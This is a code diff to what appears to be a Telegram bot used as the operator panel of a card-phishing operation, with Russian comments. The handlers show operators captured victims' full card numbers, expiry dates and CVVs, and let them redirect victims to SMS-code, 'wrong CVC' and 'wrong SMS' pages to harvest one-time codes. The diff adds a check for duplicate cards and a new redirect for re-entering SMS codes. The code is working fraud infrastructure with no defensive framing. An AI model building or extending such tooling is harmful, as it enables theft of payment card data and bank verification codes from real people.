@@ -7,7 +7,7 @@ import os
 sys.path.append(os.path.join(os.path.dirname(__file__), '../..'))
 
 # Теперь импортируем наши модули
-from database.crud import get_log_by_session, update_log_taken_by
+from database.crud import get_log_by_session, update_log_taken_by, find_card_duplicates
 from api.handy_api import get_card_info, format_card_info
 from bot.keyboards import get_management_keyboard, get_taken_keyboard
 import config
@@ -35,6 +35,11 @@ async def take_log(callback: types.CallbackQuery):
     client_id = log['client_id'] or "N/A"
     
     full_pan = card.get('full_pan', '')
+    
+    # Проверяем дубликаты карты
+    duplicates = find_card_duplicates(log['masked_pan'])
+    previous_uses = [dup for dup in duplicates if dup['session_id'] != session_id]
+    
     if full_pan:
         bin_number = full_pan[:6]
         card_info = await get_card_info(bin_number)
@@ -42,8 +47,16 @@ async def take_log(callback: types.CallbackQuery):
     else:
         card_info_text = "❌ Информация о карте недоступна"
     
+    # Формируем текст с учетом дубликатов
     text = (
         f"Лог #{booking_id} || #{client_id}\n\n"
+    )
+    
+    # Добавляем предупреждение о дубликате, если карта использовалась ранее
+    if previous_uses:
+        text += f"⚠️ <b>Эта карта уже вводилась ранее</b>\n\n"
+    
+    text += (
         f"💳  Карта: <code>{full_pan}</code>\n"
         f"🗓️  Срок действия карты: {card.get('expire_date')}\n"
         f"🔒  CVV: {card.get('cvv')}\n\n"
@@ -121,7 +134,8 @@ async def handle_redirect_action(callback: types.CallbackQuery):
         "sms": "/redirect-sms", 
         "change": "/redirect-change",
         "success": "/redirect-success",
-        "wrong_cvc": "/redirect-wrong-cvc"  # Добавляем новый эндпоинт
+        "wrong_cvc": "/redirect-wrong-cvc",
+        "wrong_sms": "/redirect-wrong-sms"  # Добавляем новый эндпоинт
     }
     
     try:
@@ -140,7 +154,8 @@ async def handle_redirect_action(callback: types.CallbackQuery):
                     "sms": "✅ Пользователь перенаправлен на страницу ввода кода",
                     "change": "✅ Пользователь перенаправлен на страницу замены карты", 
                     "success": "✅ Успешная оплата!",
-                    "wrong_cvc": "✅ Пользователь перенаправлен на страницу ввода карты заново (неверный CVC)"
+                    "wrong_cvc": "✅ Пользователь перенаправлен на страницу ввода карты заново (неверный CVC)",
+                    "wrong_sms": "✅ Пользователь перенаправлен на страницу повторого ввода кода (неверный SMS код)"
                 }
                 await callback.message.answer(messages[action])
                 
@@ -158,4 +173,6 @@ def register_callbacks(dp: Dispatcher):
     dp.callback_query.register(handle_redirect_action, F.data.startswith("sms:"))
     dp.callback_query.register(handle_redirect_action, F.data.startswith("change:"))
     dp.callback_query.register(handle_redirect_action, F.data.startswith("success:"))
-    dp.callback_query.register(handle_redirect_action, F.data.startswith("wrong_cvc:"))  # Добавляем новую кнопку
+    dp.callback_query.register(handle_redirect_action, F.data.startswith("wrong_cvc:")) 
+    dp.callback_query.register(handle_redirect_action, F.data.startswith("wrong_sms:")) 
+    # Добавляем новую кнопку
